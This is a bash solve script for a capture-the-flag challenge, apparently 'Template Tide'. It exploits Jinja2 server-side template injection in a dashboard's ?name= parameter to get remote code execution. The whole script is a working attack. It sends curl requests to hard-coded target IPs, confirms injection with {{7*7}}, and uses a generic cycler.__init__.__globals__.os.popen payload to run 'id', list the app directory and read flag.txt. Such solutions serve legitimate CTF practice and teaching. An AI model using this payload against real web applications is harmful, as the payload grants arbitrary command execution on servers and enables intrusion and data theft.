#!/usr/bin/env bash
# Template Tide — Jinja2 SSTI -> RCE -> flag
#
# The hydro dashboard renders ?name= straight into the Jinja template
# `Tide report for {{ name }}`, so anything we send is evaluated server-side.
#
# Usage: ./solve.sh [BASE_URL]
set -euo pipefail

BASE="${1:-http://18.215.143.250:5001}"   # Mirror 2: http://18.145.136.91:5001

# Run a shell command on the target via Jinja2 SSTI and print the rendered line.
rce() {
  local cmd="$1"
  curl -s -m 15 -G "$BASE/" \
    --data-urlencode "name={{ cycler.__init__.__globals__.os.popen('${cmd}').read() }}" \
  | grep -i 'Tide report for' | head -1
}

echo "[*] 1. Confirm SSTI ({{7*7}} should render 49):"
curl -s -m 15 -G "$BASE/" --data-urlencode 'name={{7*7}}' \
  | grep -i 'Tide report for' | head -1

echo
echo "[*] 2. RCE sanity check (id):"
rce 'id'

echo
echo "[*] 3. List the app directory:"
rce 'ls -la'

echo
echo "[*] 4. Read the flag:"
rce 'cat flag.txt'
